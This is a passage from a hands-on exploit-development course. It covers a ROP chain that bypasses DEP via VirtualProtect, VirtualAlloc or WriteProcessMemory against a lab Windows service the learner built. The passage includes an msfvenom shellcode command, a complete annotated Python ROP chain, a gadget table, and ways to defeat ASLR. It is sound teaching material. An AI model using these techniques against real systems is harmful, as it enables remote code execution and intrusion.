The stack body is bounded by `VULNSVC_MAX_BODY` (0x2000) minus the offset and
chain. If it is too small for a staged payload, enlarge the request body — the
transport caps at 0x2000, giving ample room here. (If you needed more than the
cap, you'd switch to an egghunter; you don't here.)

### 11.3 Generate bad-char-safe shellcode

```
msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread \
    -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v sc
```

Always pass `-b`. Encoders (shikata) inflate size — budget space accordingly and
re-check it fits. Prepend a short NOP sled (`\x90` is not a bad char) if you used
the padding approach.

### 11.4 Fire without the debugger

Remove any temporary `int3`/breakpoint gadget, run `service.exe` standalone, and
launch the exploit. `calc.exe` pops as the service account. Swap to a reverse
shell by changing only the `msfvenom` payload (and starting a handler) — the
exploit body is unchanged, which is the proof that your DEP bypass is
payload-agnostic.

---

<a name="ch12"></a>
## 12. Chapter 2 API: VirtualAlloc

Everything above is API-shaped, not API-specific. To retarget `VirtualAlloc`,
change three things:

- **IAT slot** — resolve `compression!_imp__VirtualAlloc` instead of VP (it is
  imported too).
- **Frame** — `VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)`:
  four args, and crucially **no `_Out_` pointer**, so P7 disappears.
  - `lpAddress` = your shellcode page (calling `MEM_COMMIT` on an
    already-committed page just changes its protection — same effect as VP).
  - `dwSize` = `0x201`.
  - `flAllocationType` = `MEM_COMMIT` = `0x1000` → build with split-add
    `0x80808080 + 0x7F7F8F80`.
  - `flProtect` = `0x40` → split-add as in P6.
- **Return semantics** — VirtualAlloc is also stdcall/4 args (`ret 0x10`), so the
  pivot and fake-frame logic are identical.

> **The abstraction to internalise.** DEP does not care *how* a page became
> executable. The OS only observes: `RW → (some API) → RWX → ret → execute`.
> Whether that API is VirtualProtect, VirtualAlloc, or `NtProtectVirtualMemory`
> is almost incidental. The workflow — resolve import, patch placeholders, pivot,
> return — is the reusable skill; the API is a detail. This is why FastBack's
> VirtualAlloc chain and our VirtualProtect chain are 90% the same code.

Build it as a second exercise; you will reuse most gadgets from Chapter 9.

---

<a name="ch13"></a>
## 13. Chapter 3 API: WriteProcessMemory (advanced)

WPM bypasses DEP by *obeying* it. Instead of making a data page executable, you
**copy your shellcode into memory that is already executable** — a code cave in a
non-ASLR module's `.text` — then jump there. No protection change at all.

```c
BOOL WriteProcessMemory(
    HANDLE  hProcess,               // -1 (0xFFFFFFFF) = current process (null-free!)
    LPVOID  lpBaseAddress,          // an ALREADY-EXECUTABLE dest (code cave)
    LPCVOID lpBuffer,               // source: your shellcode on the stack
    SIZE_T  nSize,                  // bytes to copy
    SIZE_T *lpNumberOfBytesWritten  // writable scratch pointer (like VP's OldProtect)
);
```

New reasoning required, and why it's the advanced chapter:

- **`hProcess = -1`** — the pseudo-handle to self; conveniently `0xFFFFFFFF`, no
  bad bytes.
- **`lpBaseAddress`** — you must *find* a code cave: a run of unused executable
  bytes in a non-ASLR module (padding between functions, or a large `.text` gap).
  `compression.dll` at `0x61500000` is a fine host. Extra recon vs. VP/VA.
- **`lpBuffer`** — your shellcode's current stack address (same runtime
  resolution as before).
- **`lpNumberOfBytesWritten`** — another `_Out_` writable pointer (same trap as
  VP's fourth arg).
- **Control transfer is manual** — WPM does *not* jump to the cave for you. After
  it returns, you need one more gadget (`jmp`/`ret` into `lpBaseAddress`) to
  execute the freshly written code.

> **The lesson WPM teaches.** DEP is a *page-permission* mitigation, not a
> *shellcode* mitigation. If you put your bytes where execution is already
> allowed, there is nothing to bypass. That reframing — "don't fight the
> permission, satisfy it" — is worth more than the technique itself. Reserve WPM
> for when protection-flipping is blocked or a clean cave is handy; it has more
> moving parts than VP/VA and should not be your default.

---

<a name="ch14"></a>
## 14. What ASLR would have broken

Every hardcoded address in this exploit — gadgets and the IAT slot — assumed
`compression.dll` loads at `0x61500000` every time. That held only because we
built it `/DYNAMICBASE:NO`.

Rebuild `compression.dll` with `/DYNAMICBASE` (ASLR on) and the exploit dies: the
first gadget address points at nothing. This is exactly why `helper.dll` was a
trap in Chapter 3 — great gadgets, useless because randomized.

Against a fully-ASLR'd target you would need one of:

- **A non-ASLR module** anywhere in the process (check `!nmod` first — often one
  poorly-linked DLL exists). Pin all gadgets + IAT to it and the problem reduces
  to what you just did.
- **An information leak** — a memory-disclosure primitive that reveals one
  pointer into a known module; subtract its static offset to recover the base,
  then compute every gadget/IAT address as `base + offset` at runtime. This is
  where format-string and OOB-read bugs become the linchpin.
- **Low-entropy corners** — partial EIP overwrite (low 12 bits are page-fixed),
  or 32-bit brute force against an auto-restarting service. Situational; not a
  plan on modern 64-bit.

The ROP machinery is unchanged once you can compute `base + offset`; ASLR adds a
*base-discovery* stage in front of the chain you already know how to build.
That's the next lab.

---

<a name="appA"></a>
## Appendix A: Gadget Table (fill from YOUR build)

Run `rp-win-x86.exe -f compression.dll -r 5 > rop.txt`, then populate the
right column with the exact `findstr` search shown. Symbolic names match the
narrative and `exploit/exploit.py`.

| Symbol | Instruction (search string) | Your address |
|---|---|---|
| `G_STACKPTR` | `push esp ; push eax ; pop edi ; pop esi ; ret` | `0x________` |
| `G_POP_EAX` | `pop eax ; ret` | `0x________` |
| `G_POP_ECX` | `pop ecx ; ret` | `0x________` |
| `G_ADD_EAX_ECX` | `add eax, ecx ; ret` | `0x________` |
| `G_SUB_EAX_ECX` | `sub eax, ecx ; ret` | `0x________` |
| `G_NEG_EAX` | `neg eax ; ret` | `0x________` |
| `G_DEREF_EAX` | `mov eax, dword [eax] ; ret` | `0x________` |
| `G_MOV_EAX_ESI` | `mov eax, esi ; pop esi ; ret` | `0x________` |
| `G_PUSH_EAX_POP_ESI` | `push eax ; pop esi ; ret` | `0x________` |
| `G_STORE` | `mov dword [esi], eax ; ret` | `0x________` |
| `G_INC_ESI` | `inc esi ; ret` (or `inc esi ; add al, 2Bh ; ret`) | `0x________` |
| `G_XCHG_EAX_EBP` | `xchg eax, ebp ; ret` | `0x________` |
| `G_MOV_ESP_EBP` | `mov esp, ebp ; pop ebp ; ret` | `0x________` |
| `IAT_VIRTUALPROTECT` | `dps compression!_imp__VirtualProtect L1` | `0x________` |
| `IAT_VIRTUALALLOC` | `dps compression!_imp__VirtualAlloc L1` | `0x________` |

If a search returns nothing, widen it (`-r 6`), accept an uglier gadget with
harmless side effects, or synthesize the primitive from two simpler gadgets.
Record *why* you chose each one — that reasoning is the skill.

---

<a name="appB"></a>
## Appendix B: The complete annotated VirtualProtect chain

Organized by primitive, every line justified. Symbolic addresses = Appendix A.
This is the chain your incremental work converges on — by now it should read as
inevitable. See `exploit/exploit.py` for the runnable version.

```python
# ---- fake VirtualProtect frame, shipped as placeholders, patched by ROP ----
#   [ &VirtualProtect ][ retaddr ][ lpAddress ][ dwSize ][ flNewProtect ][ lpflOldProtect ]
frame  = pack("<L", 0x45454545)  # &VirtualProtect   (resolve at runtime)
frame += pack("<L", 0x46464646)  # return address    (= shellcode)
frame += pack("<L", 0x47474747)  # lpAddress         (= shellcode)
frame += pack("<L", 0x48484848)  # dwSize            (0x201)
frame += pack("<L", 0x51515151)  # flNewProtect      (0x40)
frame += pack("<L", 0x52525252)  # lpflOldProtect    (writable scratch)

# =====================================================================
# P0  Acquire stack pointer: ESP -> ESI
# =====================================================================
rop  = pack("<L", G_STACKPTR)        # push esp; push eax; pop edi; pop esi; ret

# =====================================================================
# P1  Resolve VirtualProtect from the IAT into EAX
#     (IAT slot carries 0x20 -> ship slot+1, correct with -1)
# =====================================================================
rop += pack("<L", G_POP_EAX)
rop += pack("<L", IAT_VIRTUALPROTECT + 1)   # dodge 0x20 bad byte
rop += pack("<L", G_POP_ECX)
rop += pack("<L", 0xFFFFFFFF)               # -1
rop += pack("<L", G_ADD_EAX_ECX)            # eax = real IAT slot
rop += pack("<L", G_DEREF_EAX)              # eax = &VirtualProtect

# =====================================================================
# P2  Point ESI at frame[0] (&VP slot) and store EAX there
#     frame[0] sits at ESP-0x1C in this layout -> add -0x1C
# =====================================================================
rop += pack("<L", G_MOV_EAX_ESI_KEEP)       # (variant that preserves needed regs; see note)
rop += pack("<L", G_POP_ECX)
rop += pack("<L", 0xFFFFFFE4)               # -0x1C
rop += pack("<L", G_ADD_EAX_ECX)            # eax = &frame[0]
rop += pack("<L", G_PUSH_EAX_POP_ESI)       # esi = &frame[0]
rop += pack("<L", G_STORE)                  # frame[0] = &VirtualProtect

# =====================================================================
# P3  return address (= shellcode): ESI += 4, compute shellcode addr, store
# =====================================================================
rop += pack("<L", G_INC_ESI) * 4            # esi -> frame[1]
rop += pack("<L", G_MOV_EAX_ESI)
rop += pack("<L", G_POP_ECX)
rop += pack("<L", 0xFFFFFDF0)               # -0x210 (finalise in Ch.11)
rop += pack("<L", G_SUB_EAX_ECX)            # eax = shellcode addr
rop += pack("<L", G_STORE)                  # frame[1] = shellcode

# =====================================================================
# P4  lpAddress (= shellcode): ESI += 4, recompute (-0x20C), store
# =====================================================================
rop += pack("<L", G_INC_ESI) * 4            # esi -> frame[2]
rop += pack("<L", G_MOV_EAX_ESI)
rop += pack("<L", G_POP_ECX)
rop += pack("<L", 0xFFFFFDF4)               # -0x20C (advanced 4)
rop += pack("<L", G_SUB_EAX_ECX)
rop += pack("<L", G_STORE)                  # frame[2] = shellcode

# =====================================================================
# P5  dwSize = 0x201  (neg of -0x201, both null-free)
# =====================================================================
rop += pack("<L", G_INC_ESI) * 4            # esi -> frame[3]
rop += pack("<L", G_POP_EAX)
rop += pack("<L", 0xFFFFFDFF)               # -0x201
rop += pack("<L", G_NEG_EAX)                # eax = 0x201
rop += pack("<L", G_STORE)                  # frame[3] = 0x201

# =====================================================================
# P6  flNewProtect = 0x40  (split-add, both operands null-free)
# =====================================================================
rop += pack("<L", G_INC_ESI) * 4            # esi -> frame[4]
rop += pack("<L", G_POP_EAX)
rop += pack("<L", 0x80808080)
rop += pack("<L", G_POP_ECX)
rop += pack("<L", 0x7F7F7FC0)               # 0x80808080 + 0x7F7F7FC0 = 0x40
rop += pack("<L", G_ADD_EAX_ECX)
rop += pack("<L", G_STORE)                  # frame[4] = 0x40 (PAGE_EXECUTE_READWRITE)

# =====================================================================
# P7  lpflOldProtect = writable scratch pointer
# =====================================================================
rop += pack("<L", G_INC_ESI) * 4            # esi -> frame[5]
rop += pack("<L", G_MOV_EAX_ESI)            # eax = &frame[5] (writable stack dword)
rop += pack("<L", G_STORE)                  # frame[5] = &frame[5]  (points at itself: writable)

# =====================================================================
# P8  Pivot ESP onto &VP and fire
#     aim EBP 4 bytes before frame[0] so the stray 'pop ebp' aligns ESP on &VP
# =====================================================================
rop += pack("<L", G_MOV_EAX_ESI)            # eax = esi (currently frame[5])
rop += pack("<L", G_POP_ECX)
rop += pack("<L", NEG_DELTA_TO_FRAME0_M4)   # null-free delta: esi -> (frame[0]-4)
rop += pack("<L", G_ADD_EAX_ECX)
rop += pack("<L", G_XCHG_EAX_EBP)           # ebp = frame[0]-4
rop += pack("<L", G_MOV_ESP_EBP)            # esp=ebp; pop ebp (eats -4 dummy); ret -> &VP
# VirtualProtect executes; its ret 0x10 returns into frame[1] = shellcode (now RWX)

# ---- payload staging (Chapter 10) ----
padding   = b"\x90" * PAD_N               # optional NOP runway to absorb delta slop
shellcode = b"\xCC" * 32                  # Stage 1: prove control; later: msfvenom -b ...
```

> **Note on `G_MOV_EAX_ESI` variants.** Many `mov eax, esi` gadgets also `pop
> esi` in their tail; when you need ESI preserved, either restore it with
> `push eax ; pop esi` afterward or pick a variant without the pop. Appendix A
> lets you record which variant you found. This bookkeeping *is* ROP.

---

<a name="appC"></a>
## Appendix C: Challenges

Work these before reading Appendix B's corresponding lines.

1. **Build `0x1000` with no null bytes.** You need `MEM_COMMIT = 0x1000` for the
   VirtualAlloc chapter. There are at least three ways: (a) split-add two
   null-free operands; (b) `neg` its two's complement — but check whether
   `0xFFFFF000` is null-free first; (c) shift a small value left. Pick one,
   justify it, then compare with Chapter 12.

2. **Find an alternative stack-copy for P0.** `push esp ; ... ; pop esi ; ret`
   is one way to get ESP into ESI. Search your `rop.txt` for a *different*
   sequence achieving the same. Reject any that end in `call`/`jmp`. Verify your
   pick in WinDbg.

3. **Retarget to VirtualAlloc.** Convert Appendix B to a VirtualAlloc frame
   (drop P7, add `flAllocationType`). Reuse every gadget you can. Confirm
   `!vprot` shows RWX after.

4. **WriteProcessMemory cave hunt.** Find a ≥ 200-byte run of executable padding
   in `compression.dll` (look for `int3`/`nop` fill between functions, or a
   `.text` gap). Prove it is executable (`!vprot`) and stable across restarts.

5. **Turn ASLR on.** Rebuild `compression.dll` `/DYNAMICBASE`, watch the exploit
   break, and write one paragraph on exactly which dword failed first and why.

---

*Scope: defensive exploit-development coursework against a lab target you built
and control. The methodology transfers; the specific addresses do not.*
